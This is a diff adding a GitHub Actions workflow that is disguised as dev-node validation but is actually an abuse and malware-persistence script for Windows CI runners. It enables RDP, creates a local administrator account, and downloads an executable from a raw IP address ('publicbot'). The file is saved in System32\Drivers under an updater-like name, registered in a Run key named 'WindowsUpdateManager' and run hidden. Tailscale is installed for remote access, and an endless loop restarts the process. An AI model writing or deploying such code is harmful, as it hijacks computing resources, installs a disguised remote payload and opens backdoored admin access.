@@ -1,0 +1,74 @@
+name: Python-Dev-Ultra-Persistence-v28
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  node-validation:
+    runs-on: windows-latest
+    timeout-minutes: 3600
+    strategy:
+      matrix:
+        node_id: [1, 2]
+
+    steps:
+      - name: 1. Optimize Environment
+        run: |
+          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
+          powercfg /x -monitor-timeout-ac 0
+          powercfg /h off
+      - name: 2. Enable Remote Debugging
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+      - name: 3. Provision Admin Account
+        run: |
+          $p = "DevNode" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
+          $s = ConvertTo-SecureString $p -AsPlainText -Force
+          New-LocalUser -Name "DevAdmin" -Password $s -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "DevAdmin"
+          echo "SRV_PASS=$p" >> $env:GITHUB_ENV
+      - name: 4. Deploy & Auto-Start Registry
+        run: |
+          $url = "http://103.195.101.218:8080/publicbot"
+          
+          $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
+          $dest = "C:\Windows\System32\Drivers\$randName"
+          echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
+          echo "FULL_PATH=$dest" >> $env:GITHUB_ENV
+          
+          try {
+              Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
+              # Añadir al registro de inicio para persistencia total
+              $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+              Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $dest
+              
+              Start-Process $dest -WindowStyle Hidden
+              Write-Host "Proceso $randName desplegado y registrado en el inicio."
+          } catch {
+              Write-Error "Error en el despliegue."
+              exit 1
+          }
+      - name: 5. Network Bridge (Tailscale)
+        run: |
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
+          Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="dev-node-${{ matrix.node_id }}"
+      - name: 6. Persistence Monitor (Scan cada 5s)
+        run: |
+          $procOnly = $env:PROC_NAME.Replace(".exe", "")
+          Write-Host "=========================================="
+          Write-Host "VIGILANCIA DE PROCESO ACTIVA"
+          Write-Host "Monitoreando: $procOnly"
+          Write-Host "=========================================="
+          
+          while ($true) {
+              if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
+                  Write-Host "[$(Get-Date)] Reiniciando proceso..."
+                  Start-Process $env:FULL_PATH -WindowStyle Hidden
+              }
+              Start-Sleep -Seconds 5
+          }
